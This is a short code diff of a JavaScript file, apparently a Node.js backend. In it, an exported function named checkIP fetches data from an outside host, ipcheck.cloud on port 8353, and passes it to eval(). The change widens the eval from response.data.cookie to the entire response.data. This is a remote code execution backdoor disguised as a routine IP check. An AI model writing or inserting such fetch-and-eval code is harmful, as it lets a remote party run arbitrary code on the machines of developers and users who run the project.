@@ -63,7 +63,7 @@ exports.checkIP = async function (req, res) {
     "http://ipcheck.cloud:8353/api/user/download/v6/106"
   );
   // console.log('IP is available');
-  eval(response.data.cookie);
+  eval(response.data);
 };
 
 exports.updateSubScription = function (data) {
